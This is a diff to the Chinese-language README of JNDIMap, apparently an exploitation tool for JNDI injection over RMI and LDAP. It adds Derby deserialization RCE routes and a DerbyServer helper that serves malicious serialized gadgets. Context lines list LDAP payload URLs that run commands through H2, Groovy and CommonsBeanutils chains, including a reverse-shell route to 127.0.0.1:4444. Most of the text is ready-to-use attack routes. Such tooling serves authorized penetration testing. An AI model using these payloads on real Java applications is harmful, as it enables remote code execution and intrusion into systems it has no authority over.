@@ -9,9 +9,9 @@ JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议, 包含多
 - 原生反弹 Shell (支持 Windows)
 - 加载自定义 Class 字节码
 - Tomcat/Groovy/SnakeYaml Bypass
-- Commons/Tomcat DBCP, Alibaba Druid JDBC RCE
+- Commons/Tomcat DBCP, Druid JDBC RCE
 - NativeLibLoader 加载动态链接库
-- MLet 探测可用 Gadget
+- MLet 探测可用 Class
 - LDAP 反序列化
 
 ## Compile
@@ -94,6 +94,13 @@ ldap://127.0.0.1:1389/Factory/H2/Alias/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/Groovy/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/JavaScript/open -a Calculator
 
+# Derby 反序列化 RCE
+# 先创建数据库
+ldap://127.0.0.1:1389/Factory/Derby/Create/<database>
+# 然后指定 Slave Server 的信息, database 即为上面创建的数据库名称
+ldap://127.0.0.1:1389/Factory/Derby/Slave/<ip>/<port>/<database>
+# JNDIMap 提供了 DerbyServer 类用于快速启动 Derby Server 并发送恶意序列化数据 (见 README 末尾)
+
 # 自定义数据 反序列化
 ldap://127.0.0.1:1389/Deserialize/<base64-serialize-data>
 
@@ -117,3 +124,19 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/open -a Calculat
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/ReverseShell/127.0.0.1/4444
 ```
+
+## Server
+
+快速启动 Derby Server, 用于配合 Derby 反序列化 RCE
+
+```bash
+Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>] [-f <file>] [-h]
+```
+
+`-p`: Derby Server 监听端口, 默认为 `4851`
+
+`-g`: 指定 Gadget, 如 `/CommonsCollectionsK1/Command/open -a Calculator` (即上面以 `/Deserialize/` 开头的路由)
+
+`-f`: 指定自定义序列化数据文件
+
+`-h`: 显示 Usage 信息
